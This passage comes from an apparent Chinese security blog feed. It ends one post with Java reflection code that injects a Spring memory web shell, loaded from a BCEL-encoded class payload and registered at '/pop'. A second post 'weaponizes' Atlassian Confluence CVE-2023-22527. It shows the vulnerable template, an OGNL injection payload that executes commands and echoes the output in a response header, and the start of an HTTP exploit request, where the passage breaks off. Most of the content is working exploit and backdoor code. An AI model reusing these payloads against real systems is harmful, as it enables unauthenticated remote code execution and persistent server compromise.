class="comment">//最终获取到RequestMapping，结束。接下来注册路由</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> getBean.invoke(springRoot, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">config</span> <span class="operator">=</span> configField.get(requestMappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">paths</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>).getDeclaredMethod(<span class="string">&quot;paths&quot;</span>, String[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">options</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;options&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">build</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;build&quot;</span>);</span><br><span class="line">        paths.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        options.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        build.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder1</span> <span class="operator">=</span> paths.invoke(springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/pop&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder2</span> <span class="operator">=</span> options.invoke(builder1, config);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> build.invoke(builder2);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bcelclassLoader</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>).newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">loadClassmethod</span> <span class="operator">=</span> bcelclassLoader.getClass().getMethod(<span class="string">&quot;loadClass&quot;</span>, String.class);</span><br><span class="line">        Class Memshell= (Class) loadClassmethod.invoke(bcelclassLoader,<span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$JtTW$Z$fen2$93$f7f$e6$r$q$TH$98$40$cb$o$84$ecS$c2$o$q$40$T$C$b1i$93$902$U$I$b4$c5$97$c9K20$997$bcy$93$80K$b5$ae$d5Z$d7V$c4$7d$abqA$zX$H$y$d0R$95V$ebR7$dck$5d$ab$d6$e5$i$cf$d1s$f4$9cj$fd$ee$7b$938$93L$ca1gr$df$bd$ff$ff$df$ff$fe$cb$f7$ff$ef$be$t$fe$f3$d0$c3$A$d6$e3$af$7e$f8$f0J$3f$ee$c0$ab$e4$f0j$Vw$fa$f1$g$bcV$c5$eb$U$bc$de$P$FoP$f0F$3f$ee$c2$9b$a4$e4$9bU$MJ$e2$dd$w$O$aa$b8M$c1$5bT$dc$ae$e2$90$P$f7$e0$ad$w$fa$V$bcM$c5$dbU$bc$c3$8fw$e2$5d$7e$94$e3$5e$V$f7$c9$e7$bb$V$9cP$f1$k$V$t$fdX$8a$f7$aax$9f$8a$f7$x$f8$80$5c$7d$d0$8f$P$e1$c3$7e$ac$c4GT$7cT$3e$3f$s$87$8f$cb$e1$7e9$7c$c2$8fE$98$92$c3$t$e5$c0$e5$3d$f8$94$82O$fbx$cagT$9c$f2$e3$b3$f8$9c$b4$eb$f3$K$k$90$cf$d3$7e$fav$c6$8f$_$e0A9$7cQA$c6$8f$cd$92r$X$kTpV$a0dK$y$R$b3$b7$J$U$d7$d5$ef$V$f0t$99$c3$86$c0$82$deX$c2$e8O$8f$P$Z$d6$k$7d$uNJ$b0$d7$8c$ea$f1$bd$ba$V$93$eb$y$d1c$8f$c5R$C$eb$7b$a3$e6x$d88$a6$8f$t$e3F8$954$e2$e1$a8$99$b0$z3$k7$ac$f0$f6$a8$R$efI$i6$a2$f6$k$b3k$86$dc$$$b0$a8$ae$f7$b0$3e$a1$87$e3zb4$i$b1$adXb$b4$5d$daP$ac$eb$ba$3cp$OS$a0$bc$cf$b0$c7$cc$e1$B$dd$d2$c7$N$db$b0x$b875f$c4$e3$C$o$vP$93$b3g$c02$a3F$w$b5$3d$j$8b$P$3b$c7$J$93$ffQ$81JW$um$c7$e2$e1HTO$q$inqt$7c$98$d1$98$b4bTK$db$5c$a1$98I$3d$b1$84$bd$cf$nK$r$c6$M$cf9e$e7$b1$a8$91$b4cf$82$3c$z$95$94f$f6$9a$fa$b0TQ$9d$p$d6$V$d7S$v$97A$c1k$a3i$cb2$S$f6n$e3h$daH$d9$9d6$dd$hJ$dbF$ca$f5$$$df$P$cb$Y$893va$97$c7$dd$81$ec$b6n$3dj$e4$87i$d7$90$8c2E$fc$a3$c6$b4r$B$c5$9a$9e$F$ir$wi$sR$dc$a9Z3S$8d$8c$99$98$K$f8$b8$dc$97$N$84$_e$q$86wZ$96$c9yi$c4$d6$a3G$fa$f4$a4$93$7e$c2G$c19$F_ba$b0$A$IyB$9bH$s$ki$c1L$60d$8a$a8$af$9b$89$ddT7$d7$d8$C$Q$u$e4$91gB$b76$I$y$cf$e1$f5$9b$91tt$ac$3bf$c4$87s$b3$mF$5c$e9V$81P$810$3a$f2Y$85$eb$E$wf$t$a9$5d$c1C$acx$d6$8fkw$l$ed$5e1$e7T7$Zy$c7$8e$b3$b6$e8w$c4L$5bQ$a3$3b$s$cbcIa$e8$b7Hm$g$b6b$9b$82$f3$g$$$e0$a2$86$87$f1$88$c0$W$d3$gmqA4$o$931iZGZ$s$8d$a1$WYM$c61$bb$r$9b$c9$96ln$bb$5c$f2$N$a6D8s$a1$e1$S$k$VX$3c$l$bcX$d7$b3$bc$d5$f0e$7c$85e5$3b$e2$cc$aa$86$af$e2$b2$86$c7$f0$b8$86$af$cd$Sr3$a5$e0$eb$g$9e$A$d5V$W$u$W$B$Q$7bf$aa$rAO$U$7cC$c37$f1$z$N$df$c6$93$y$b6$c9XB$c3w$f0$5d$g$3b_$c5r3K$b2$c58$c6$40$W$85$a32$5e$df$p$z$3c$UK$84Sc$a45$b3$96$x$e6$94$b2$86$ef$e3$H$K$aeh$f8$n$7e$q7$fd$98$b9$e9$d4$f0$T$fcT$c3$cf$f0s$NO$e1I$N$bf$c06$NOc$87$86_$ca$d9$af$f0$ebi$_$f2$cbZ$c3o$f0$5b$c6m$bbi$8e$c6$92fr$b9S$Kw$u$f8$9d$86g$e4$f6$df$e3$P$y$e8$XF$a5$86$3f$ca$un$c5$O$82K$c3$b3$f8$93$86$3f$e3$_$C$cb$ae$82$x$81$d6$ff$bf$b3$b2A$Vl$3cy$b1$ce$ef$wlV$f3TJ$5e$da$f7$8cY$86NRi$W$60$d3$eb$85u$b95$ebRe$7fg$f9d$n$9agF$uO$3c$bf5$fa$e2$9c9$q$81$d5$85$de$Ps$ea$d5mW$d3$7et$U$d8sp$ce$9e$fa$X$ea$af$r$b1$c4$84y$84$a8$db$5c$a0$5d$j$9cK$w$d8$afT$e9$bb$ebF$e5$5cw$vPA$81$jF4$ae$5b$c6$f0$b4$f1$V$ff$T$eba$d8Fe$b0$3c$7b$G$Hv$e6$X$df$f1$94m$8c$bb$dd$9c$r$934$y$fb$b8$40$edU$825$f3$K$N$d8f$af9iX$5d$ba$ec$fc$f9$a9$9b$RR$r$ca$f4$98l$deKr$Vw$8d$e9VD$b6$95D$d4h$af$3f$mPUw$b0$f0K$dc$9b$b2u$cb$96$_$f9$fa$b9$_$e5$f6$3c_$b3D$812z$d4$93H$a6m$ea1t$baX$3d$bd$99$ad$r$87$c1$ed$8b$eb$K2$e4$c9Z$3ae$ec0$e2$b1q$b7$L$ad$99$3f0$b3$ae$A$ca$98$9e$ea$tX$9d$bb$Q$7d$f3$q$9c$857$g7e$a8$bc$ce$dd$80$cf$91xZ6$meB$8f$a7$8d$5d$p2$I$3d$b9Nfs$t$_$Vf$da$9es$97$98$f1$a1$b2$A$99je$ff$b7$e3$ac$fd$f2$i$88d$8b$b1$f9$wY$9e$fd$96$x$a5$8aH$9a$Q$89$baX$yM$ZvgTF$3b$e6$5e$e0$ea$O87$$$8a$cd$82$d0$fc$e0$c6$Kl$e1$VX$fey$d9$e2$f9$g$e3x$3dW$eb$f8$U$92$dap$W$e24$tE$e8$e0$e8$e7$T$dc$e0A$A$9d$9ci$ae$Q$b6$a3$Lp$U$ec$a0$84T$b0$95$ab$a2$f9$UhTP$e6$u$a8r$85$b2$K$e4l$t$ba$b9$f5$rr$$$b8$90Zo$a0Y$8e$d6$e2$w$94$f0$de$N1q$OE$Z$U$f76$G$3d$Zx$83$r$c5$X$a1d$a0$f65$b9$E$$$7d$Z$f8$fb$9b3$I$E5$97Y$da$e6$Jy$9a$b3$9c6$af$c3$w$9bf$95$84JfXJ$c8$xy$L$3c$e4$N$W$H$cb$pR$40$N$v$92X1$bd$c1$e7$ae$83$ae$d0$ZT$3aR$fe$90$g$f2$92$e4$e3$be$85$a4$f8$_$a1$bc$z$Q$a2pV$f9$r$yj$d3B$81$c7p_$b0$aa$ad4X$7d$O$8b3$I$Fk2Xr$S$x$cfc$e9$60$c9E$94s$f75$91AO$f0$da$c8$a07$U$88$9c$c5$b2$b6$b2$v$y$cba$_$97$ec$V9$ec$f3X9$Y$w$cb$e0E$Z$ac$3a$8b$d5$c1$da$M$d6$b4$z$I$z$c8$a0$ee$q$C$f2Y$3f$Fo$a8$b4$adT$ce$hBZ$a84$83$c6$90$96A$93$i$9a$a7$b08$e4$P$v$ae$ed$V$e2$desh$91$f6$ef$9b$a2W$813$b8$$$b86$83$d6$d3$cc$c5$J1$s$8e$m$8cb$t$9d$T$b8$86c9$bfN$wP$8d$mjQ$89$NX$c8$d4$$$c2$A$93$7b$x$a9G$b1$Yw$o$84$T$fc$w$3aE$f9$L$b8$W$8fb$Z$$$T$7cW$f8$n$f4w$ac$S$e5$a8$V$b5X$p$daP$t$aeG$bd$e8F$83$b8$J$8db$AM$o$82$W1$86V$9ez$9d$Y$c7Z$91$s8$rt2$3c$efo$b4$a3$H7$SL$97q7n$otJ$a9$ab$c3$a5Qc$Dz$d1$87$F$3c$f7$C$fa$c9$N$f0y$K$bbh$9bF$5d$wn$c6n$d2$88$a7$y$A$Va$o$82$3d$f4$b3Z$i$c2$z$d8K$dc$d5$d2$8a$7d$d8$cf$936$88N$M$92$e6A$a7$d8$80$D$a4y1$c0S$O$92V$82$5bE$N$fd$dd$cfX$i$V$5e$dcF$g$3f$3c$f1$P$dc$ce$99$8f$de$3f$8dC$9c$f9$f1R$9e$d3$P$f5y$3a$5e$a6$40W0$a4$m$aa$60x$ce$e8$fex$df$g$e1$I$3c$87$r$KF$9f$c3j$Fc$9d$a4$fc$T5$ff$c2$c2$ed$Kb$3e$i$a6N$P$ad$OS$ff$R$c4i$ab$ac$c1$x$7cz$f9$dc$q$fa$g$88$d6$fe$e6$a0$ef$7eT57f$b0$aeO$s$d6$c3$o$d8$d0$3f$f5$fc$b3M$8fC$3b$8f$f5$83$8dg$b1$f1$91$sV$d0$8b$9b$b8a$d3$D$d4X$ca$8cV$f1$c3$d3$cdw$xK$X$ccp$R6$d2$cfM$e4$b6$91$dfN$89$z$cc$f2Vfw$h$963$3b$ab$Y$cff$f6$82VVp$a7$f3Q$ee$r$df$8bq$qh$t$zb$ae$f6$3b$F$bf$J$a6S$f0Rc$92X$v$a2$de$b5$b0$90$e2$892R$V$f0$fc$h$8a$C$5ec$d3$fc$U$9f$f0i9$ce$ca$$$e1$x$a2$$P$8bl$$$933$be$3f$95$f5$bd$p$d7$f7$9a$e6$c6l$B$e7$f9$ff$8c$eb$fff$e9$7f$9b$e3$7f$7bSC$b6b$dd$YT$a3$86$9f$da$b91$e8$a1$a57$d2$d6$5er$fb$c9$dfE$89$B$o$fcf$a2z7$fd$bf$Fu$cc$f6Zz$b9$91$98$99$8e$c1R$t$G$c7$9c$Yt$cc$c4$a0$D$c7$b31$d8$c6$Y$ecub$b0$b9$40$M$88$86$f4n$F$_$9b$_$G$c7$9dn$f9r$a7$d9$be$e2$bf$v$y$i$86$P$R$A$A&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">shell</span> <span class="operator">=</span> Memshell.getMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        Object InjectMemshell=Memshell.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">registerMapping</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>).getDeclaredMethod(<span class="string">&quot;registerMapping&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), Object.class, Method.class);</span><br><span class="line">        registerMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        registerMapping.invoke(requestMappingHandlerMapping,requestMappingInfo,InjectMemshell,shell);</span><br><span class="line">        System.out.println(<span class="string">&quot;inject successfully&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再把这个类编译为BCEL注入。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691642899449-ff7e9a95-fab3-4564-873e-96c978012b6f.png#averageHue=%239e9d9c&clientId=u1e300139-0fb9-4&from=paste&height=807&id=uc3d1e5b1&originHeight=1009&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=259401&status=done&style=none&taskId=ude9db27d-2162-4251-a382-d88f7d0b712&title=&width=1532" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691642927814-565a6076-4c8b-4239-8ded-72abaee30751.png#averageHue=%23d0c3b0&clientId=u1e300139-0fb9-4&from=paste&height=175&id=ub378676e&originHeight=219&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25585&status=done&style=none&taskId=ub9ff23c2-c96a-4334-881e-26316d363b7&title=&width=1526.4" alt="image.png"><br>至此算是告一段落了。后续会补充一些tomcat内存马全反射形式，然后加入哥斯拉逻辑，可以哥斯拉连接。</p>]]></content>
    
    
    <summary type="html">zero</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="CTF" scheme="http://boogipop.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Atlassian Confluence CVE-2023-22527 分析及武器化实现</title>
    <link href="http://boogipop.com/2024/02/29/Atlassian%20Confluence%20CVE-2023-22527%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%AD%A6%E5%99%A8%E5%8C%96%E5%AE%9E%E7%8E%B0/"/>
    <id>http://boogipop.com/2024/02/29/Atlassian%20Confluence%20CVE-2023-22527%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%AD%A6%E5%99%A8%E5%8C%96%E5%AE%9E%E7%8E%B0/</id>
    <published>2024-02-29T00:41:58.000Z</published>
    <updated>2024-02-29T00:41:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-0-参考文献"><a href="#0-0-参考文献" class="headerlink" title="0-0 参考文献"></a>0-0 参考文献</h1><p>文章在先知社区首发</p><p><a href="https://xz.aliyun.com/t/13351?time__1311=mqmxnDBG0QIxcDBqDTeeqBIoK7uktlliiGoD&alichlgref=https://www.google.com/">Atlassian Confluence 模板注入代码执行漏洞（CVE-2023-22527） - 先知社区</a><br><a href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">Bypassing OGNL sandboxes for fun and charities</a></p><h1 id="0-1-简要分析"><a href="#0-1-简要分析" class="headerlink" title="0-1 简要分析"></a>0-1 简要分析</h1><p>漏洞点源自于<code>/template/aui/text-inline.vm</code>路由的一个未授权访问，这是一个velocity模板文件，该模板文件内容如下</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#set( $labelValue = $stack.findValue(&quot;getText(&#x27;$parameters.label&#x27;)&quot;) )</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>( !$labelValue )</span></span><br><span class="line">    <span class="meta">#set( $labelValue = $parameters.label )</span></span><br><span class="line"><span class="meta">#end</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (!$parameters.id)</span></span><br><span class="line">    <span class="meta">#set( $parameters.id = $parameters.name)</span></span><br><span class="line"><span class="meta">#end</span></span><br><span class="line"></span><br><span class="line">&lt;label id=<span class="string">&quot;$&#123;parameters.id&#125;-label&quot;</span> <span class="keyword">for</span>=<span class="string">&quot;$parameters.id&quot;</span>&gt;</span><br><span class="line">$!labelValue</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>($parameters.required)</span></span><br><span class="line">    &lt;span <span class="keyword">class</span>=<span class="string">&quot;aui-icon icon-required&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span <span class="keyword">class</span>=<span class="string">&quot;content&quot;</span>&gt;$parameters.required&lt;/span&gt;</span><br><span class="line"><span class="meta">#end</span></span><br><span class="line">&lt;/label&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#parse(&quot;/template/aui/text-include.vm&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点自然就在<code>$stack.findValue(&quot;getText(&#39;$parameters.label&#39;)</code>明显的一段OgnlStack的findValue操作，那么label参数就会被ognl解析。因此payload第一段为</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa<span class="keyword">\u</span>0027<span class="comment">%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],&#123;&#125;)%2b\u0027</span></span><br></pre></td></tr></table></figure><p>用unicode是为了防止url编码导致参数传入失败。并且Ognl是支持unicode编码的。之后就是poc的第二段</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#x27;Cmd-Responses-Header&#x27;,(new freemarker.template.utility.Execute()).exec(&#123;&quot;id&quot;&#125;))</span><br></pre></td></tr></table></figure><p>用freemarker去做命令执行处理,cmd回显策略。这一段就是很普通的ognl命令回显了，并没有什么其他的操作。</p><h2 id="0-1-1-有趣的思考"><a href="#0-1-1-有趣的思考" class="headerlink" title="0-1.1 有趣的思考"></a>0-1.1 有趣的思考</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673068920-0abd368c-aa6f-4b41-b807-82baf219f6d3.png#averageHue=%232f333a&clientId=u9363bb59-db00-4&from=paste&height=675&id=ubc494160&originHeight=844&originWidth=1881&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=277246&status=done&style=none&taskId=u1273c3bc-4331-44d8-bb33-1983b3a8ed9&title=&width=1504.8" alt="image.png"><br>漏洞点中的context如上图所示，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&quot;com.opensymphony.xwork2.ActionContext.locale&quot; -&gt; &#123;Locale@66441&#125; </span><br><span class="line">&quot;request&quot; -&gt; &#123;RequestMap@66442&#125;  size = 32</span><br><span class="line"> key = &quot;request&quot;</span><br><span class="line"> value = &#123;RequestMap@66442&#125;  size = 32</span><br><span class="line">  &quot;__prepare_recursion_counter&quot; -&gt; &#123;Integer@66509&#125; 1</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.RemoteHost&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">  &quot;com.atlassian.confluence.util.message.MessagesDecoratorFilter__already_filtered__&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;Confluence-Request-Time&quot; -&gt; &#123;Long@66515&#125; 1707673048234</span><br><span class="line">  &quot;com.opensymphony.sitemesh.APPLIED_ONCE&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.tomcat.remoteAddr&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">  &quot;B3-TraceId&quot; -&gt; &quot;a981718bad3947&quot;</span><br><span class="line">  &quot;struts.actionMapping&quot; -&gt; &quot;noActionMapping&quot;</span><br><span class="line">  &quot;__wrap_recursion_counter&quot; -&gt; &#123;Integer@66509&#125; 1</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.Protocol&quot; -&gt; &quot;HTTP/1.1&quot;</span><br><span class="line">  &quot;.KEY_velocity.struts2.context&quot; -&gt; &#123;StrutsVelocityContext@66526&#125; </span><br><span class="line">  &quot;com.atlassian.confluence.web.ConfluenceJohnsonFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;brave.propagation.TraceContext&quot; -&gt; &#123;TraceContext@66529&#125; </span><br><span class="line">  &quot;com.atlassian.gzipfilter.GzipFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.ServerName&quot; -&gt; &quot;localhost&quot;</span><br><span class="line">  &quot;atlassian.core.seraph.original.url&quot; -&gt; &quot;/template/aui/text-inline.vm&quot;</span><br><span class="line">  &quot;com.atlassian.labs.botkiller.BotKillerFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;sessioninview.FILTERED&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.struts2.dispatcher.filter.StrutsPrepareFilter.REQUEST_EXCLUDED_FROM_ACTION_MAPPING&quot; -&gt; &#123;Boolean@66538&#125; false</span><br><span class="line">  &quot;com.atlassian.confluence.web.filter.validateparam.RequestParamValidationFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;brave.servlet.TracingFilter$SendHandled&quot; -&gt; &#123;TracingFilter$SendHandled@66541&#125; </span><br><span class="line">  &quot;brave.SpanCustomizer&quot; -&gt; &#123;SpanCustomizerShield@66543&#125; </span><br><span class="line">  &quot;sitemesh.secondaryStorageLimit&quot; -&gt; &#123;Long@66545&#125; -1</span><br><span class="line">  &quot;org.apache.tomcat.request.forwarded&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.prettyurls.filter.PrettyUrlsSiteMeshFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;org.apache.catalina.AccessLog.ServerPort&quot; -&gt; &#123;Integer@66549&#125; 8090</span><br><span class="line">  &quot;os_securityfilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.core.filters.HeaderSanitisingFilter_already_filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.prettyurls.filter.PrettyUrlsSiteMeshFixupFilter&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;loginfilter.already.filtered&quot; -&gt; &#123;Boolean@66513&#125; true</span><br><span class="line">  &quot;com.atlassian.confluence.impl.profiling.DecoratorTimings&quot; -&gt; &#123;DecoratorTimings@66555&#125; </span><br><span class="line">  &quot;org.apache.catalina.AccessLog.RemoteAddr&quot; -&gt; &quot;127.0.0.1&quot;</span><br><span class="line">&quot;session&quot; -&gt; &#123;SessionMap@66443&#125;  size = 1</span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.PageContext&quot; -&gt; &#123;PageContextImpl@66445&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot; -&gt; &#123;OgnlValueStack@60828&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.container&quot; -&gt; &#123;ContainerImpl@66448&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot; -&gt; &#123;StrutsRequestWrapper@60863&#125; </span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot; -&gt; &#123;OAuthFilter$OAuthWWWAuthenticateAddingResponse@66451&#125; </span><br><span class="line">&quot;last.property.accessed&quot; -&gt; null</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.parameters&quot; -&gt; &#123;HttpParameters@66454&#125;  size = 2</span><br><span class="line">&quot;com.opensymphony.xwork2.dispatcher.ServletContext&quot; -&gt; &#123;StandardContext$NoPluggabilityServletContext@66456&#125; </span><br><span class="line">&quot;last.bean.accessed&quot; -&gt; null</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.application&quot; -&gt; &#123;ApplicationMap@66459&#125;  size = 21</span><br><span class="line">&quot;com.opensymphony.xwork2.ActionContext.session&quot; -&gt; &#123;SessionMap@66443&#125;  size = 1</span><br><span class="line">&quot;application&quot; -&gt; &#123;ApplicationMap@66459&#125;  size = 21</span><br><span class="line">&quot;attr&quot; -&gt; &#123;AttributeMap@66463&#125; Unable to evaluate the expression Method threw &#x27;java.lang.UnsupportedOperationException&#x27; exception.</span><br><span class="line">&quot;current.property.path&quot; -&gt; null</span><br><span class="line">&quot;parameters&quot; -&gt; &#123;HttpParameters@66454&#125;  size = 2</span><br></pre></td></tr></table></figure><p>其中<code>.KEY_velocity.struts2.context</code>对应获取context上下文，那么这些其他的属性呢？我们也是可以获取的，是否有其他利用点呢？我相信答案肯定是有的，这里笔者就不偏离主题了，只阐述一下一种可能的思路。今天的重点是武器化</p><h1 id="0-2-武器化实现"><a href="#0-2-武器化实现" class="headerlink" title="0-2 武器化实现"></a>0-2 武器化实现</h1><h2 id="0-2-1-出网"><a href="#0-2-1-出网" class="headerlink" title="0-2.1 出网"></a>0-2.1 出网</h2><h3 id="0-2-1-1-ClassPathXmlApplicationContext"><a href="#0-2-1-1-ClassPathXmlApplicationContext" class="headerlink" title="0-2.1.1 ClassPathXmlApplicationContext"></a>0-2.1.1 ClassPathXmlApplicationContext</h3><p>出网的话解决方法也好说，Poc如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: 